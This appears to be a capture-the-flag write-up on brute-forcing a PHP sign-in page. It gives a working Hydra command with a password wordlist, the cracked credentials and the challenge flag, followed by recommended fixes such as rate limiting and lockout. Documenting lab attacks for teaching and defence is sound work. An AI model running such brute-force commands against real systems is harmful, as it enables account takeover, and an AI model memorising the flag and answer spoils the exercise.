# Bruteforce Login Vulnerability

## 🎯 Overview
This vulnerability demonstrates a weak authentication system that is susceptible to bruteforce attacks. The target endpoint `index.php?page=signin` lacks basic security measures like rate limiting and password complexity requirements.

## 🔍 Exploitation Process

### Tools Used
- **Hydra**: A parallelized login cracker supporting multiple protocols
- **Wordlist**: Common password dictionary (10-million-password-list-top-500.txt)

### Attack Command
```bash
hydra -l admin -P /root/dictionary/10-million-password-list-top-500.txt -F -o hydra.log x.x.x.x http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'
```

### Command Breakdown
| Parameter | Description |
|-----------|-------------|
| `-l admin` | Specifies the target username |
| `-P [path]` | Path to the password wordlist |
| `-F` | Stop attack when valid credentials found |
| `-o hydra.log` | Output log file location |
| `http-get-form` | Protocol specification for GET form |

### Attack Result
- **Username**: admin
- **Password**: shadow
- **Flag**: B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

## 🛡️ Security Issues Identified
1. Weak password policy
2. No bruteforce protection
3. No rate limiting
4. No account lockout mechanism
5. Common admin username

## 🔒 Recommended Security Fixes

### 1. Implement Rate Limiting
```python
# Example rate limiting logic
MAX_ATTEMPTS = 5
LOCKOUT_TIME = 15 # minutes
```

### 2. Password Policy Requirements
- Minimum length: 12 characters
- Must include:
  - Uppercase letters
  - Lowercase letters
  - Numbers
  - Special characters
- Password history enforcement
- Regular password rotation

### 3. Additional Security Measures
- Implement CAPTCHA after failed attempts
- IP-based blocking after suspicious activity
- Multi-factor authentication (MFA)
- Account lockout after multiple failed attempts
- Secure session management

## 📚 Additional Resources
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [Common Password Lists](https://en.wikipedia.org/wiki/List_of_the_most_common_passwords)

## ⚠️ Disclaimer
This documentation is for educational purposes only. Always obtain proper authorization before testing security measures on any system.